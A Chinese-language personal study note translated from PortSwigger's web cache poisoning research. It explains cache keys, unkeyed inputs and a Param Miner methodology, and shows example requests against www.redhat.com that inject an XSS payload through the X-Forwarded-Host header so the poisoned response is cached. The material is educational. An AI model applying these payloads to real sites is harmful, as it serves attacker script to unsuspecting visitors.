> 本文 翻译整理自[实用的web缓存中毒](https://portswigger.net/research/practical-web-cache-poisoning)，记录仅作个人学习使用，侵删
## 核心概念
### Caching 101
Web缓存位于用户和应用程序服务器之间，它们保存和提供某些响应的副本。在下图中，我们可以看到三个用户一个接一个地获取相同的资源：
![](media/Pasted%20image%2020231003235129.png)

### Cache keys
每当缓存收到一个资源的请求时，它需要决定是否已经保存了这个确切资源的副本，并可以用它来回复请求，还是需要将请求转发给应用服务器。逐字节匹配不现实，这就出现了`缓存键`解决问题
```java
GET /blog/post.php?mobile=1 HTTP/1.1  
Host: example.com  
User-Agent: Mozilla/5.0 … Firefox/57.0  
Cookie: language=pl;  
Connection: close
```

```java
GET /blog/post.php?mobile=1 HTTP/1.1  
Host: example.com  
User-Agent: Mozilla/5.0 … Firefox/57.0  
Cookie: language=en;  
Connection: close
```

在上述请求中，使用了HTTP方法`GET`和主机名`example.com` 以及请求路径`/blog/post.php` 和查询字符串`?mobile=1`来作为缓存建，可想而知，该页面将以错误的语言提供给第二个访问者
>这暗示了一个问题--由非键控输入触发的响应中的任何差异都可能被存储并提供给其他用户

#### 补充：
```
缓存通过使用缓存键（cache keys）的概念来解决这个问题 - 这是 HTTP 请求的一些特定组件，用于完全标识被请求的资源

缓存键通常包括用于唯一标识资源的以下元素：

1. **HTTP方法 (HTTP Method):** 这表示请求的类型，例如 GET、POST、PUT 或 DELETE。

2. **主机名 (Host Name):** 表示请求资源的主机名或域名，用于定位资源的来源。

3. **路径 (Path):** 表示请求资源的路径，即 URL 中主机名之后的部分。

4. **查询字符串 (Query String):** 表示查询参数，如果请求中包含查询参数，它们也会被包括在缓存键中。

```

### Cache Poisoning
Web缓存中毒的目的是发送导致有害响应的请求，这些响应被保存该高速缓存中并提供给其他用户。
![](media/Pasted%20image%2020231004000647.png)
1. HTTP头等非键控输入
2. HTTP响应拆分
3. 请求走私

### Methodology
1. 找到非键控输入 ，Param Miner
2. 评估你可以用它做多少破坏，然后尝试将它存储该高速缓存中。
3. 缓存的响应可以屏蔽未键控的输入，因此如果您试图手动检测或探索未键控的输入，那么缓存终结者是至关重要的。如果加载了Param Miner，则可以通过向查询字符串添加一个值为$randomplz的参数来确保每个请求都有一个唯一的缓存键。
4. ~~当审核一个实时网站时，意外地毒害其他访问者是一个永久的危险。Param Miner通过向Burp的所有出站请求添加缓存破坏器来缓解此问题。这个缓存buster有一个固定的值，因此您可以自己观察缓存行为，而不会影响其他用户。~~

### Basic Poisoning
1. 找到非键控输入
```code
GET /en?cb=1 HTTP/1.1  
Host: www.redhat.com  
X-Forwarded-Host:      **canary** 
  
HTTP/1.1 200 OK  
Cache-Control: public, no-cache  
…  
<meta property="og:image" content="https://  **canary **  /cms/social.png" />
```
2. 评估是否可利用
```code
GET /en?dontpoisoneveryone=1 HTTP/1.1  
Host: www.redhat.com  
X-Forwarded-Host:     **a."><script>alert(1)</script> **
  
HTTP/1.1 200 OK  
Cache-Control: public, no-cache  
…  
<meta property="og:image" content="https://   **a."><script>alert(1)</script>**  "/>
```
3. 检查此响应是否已存储在缓存中，以便将其传递给其他用户
```code
GET /en?dontpoisoneveryone=1 HTTP/1.1  
Host: www.redhat.com  
  
HTTP/1.1 200 OK  
…  
<meta property="og:image" content="https://a."><script>alert(1)</script>"/>
```

### Discreet poisoning


## Tools
[Param Miner](https://github.com/PortSwigger/param-miner)

## Paper
[实用的web缓存中毒](https://portswigger.net/research/practical-web-cache-poisoning)
